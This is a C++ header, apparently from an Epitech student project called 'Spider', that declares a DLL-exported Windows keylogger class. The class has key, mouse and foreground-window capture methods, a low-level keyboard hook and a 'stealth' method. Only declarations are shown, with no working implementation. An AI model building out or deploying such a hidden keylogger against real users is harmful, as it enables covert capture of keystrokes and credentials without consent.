//
// Keylog.hh for Spider client in C:\Users\vezia_l\Documents\Epitech\cpp_spider\client\inc
// 
// Made by Louis VEZIA
// Login   <vezia_l@epitech.eu>
// 
// Started on  Tue Nov  1 13:50:30 2016 Louis VEZIA
// Last update Tue Nov  1 13:50:48 2016 Louis VEZIA
//

#ifndef KEYLOG_HH_
# define KEYLOG_HH_

#include <iostream>
#include <fstream>
#include <Windows.h>

class __declspec(dllexport) Keylog
{
public:
	Keylog();
	~Keylog();
	int		getKey();
	int		getMouse();
	int		getForeground();
	int		stealth();

	bool __stdcall installhook();
	static LRESULT __stdcall  CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);

private:
	HWND	fg;
	int		mousePosX;
	int		mousePosY;
	int		keyPressed;


	// CALLBACK
	//static HHOOK	hkb;
	HINSTANCE		hins;
	HHOOK hkb;
};



#endif /* !KEYLLOG_HH_ */